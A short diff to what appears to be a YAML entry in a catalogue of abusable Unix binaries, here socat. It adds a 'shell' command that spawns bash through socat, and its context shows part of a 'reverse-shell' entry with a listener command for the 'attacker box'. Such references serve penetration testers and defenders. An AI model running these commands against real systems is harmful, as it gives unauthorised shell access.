@@ -1,5 +1,8 @@
 ---
 functions:
+  shell:
+    - code: |
+        socat STDIN EXEC:/bin/bash
   reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
